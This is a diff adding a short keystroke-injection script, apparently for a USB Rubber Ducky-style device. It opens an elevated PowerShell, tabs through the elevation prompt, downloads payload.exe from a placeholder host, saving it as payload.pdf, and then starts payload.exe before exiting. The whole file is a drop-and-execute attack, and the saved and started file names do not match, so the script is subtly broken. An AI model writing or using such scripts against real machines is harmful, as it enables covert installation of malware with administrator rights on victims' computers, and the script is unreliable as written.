@@ -1,0 +1,27 @@
+DELAY 2000
+GUI d
+DELAY 400
+GUI r
+DELAY 400
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+TAB
+DELAY 400
+TAB
+DELAY 400
+ENTER
+DELAY 800
+STRING cd / 
+ENTER
+STRING mkdir /win
+ENTER
+STRING cd /win
+ENTER
+STRING wget 'http://www.example.com/payload.exe' -OutFile payload.pdf
+ENTER
+DELAY 500
+STRING START payload.exe
+ENTER
+STRING exit
+ENTER
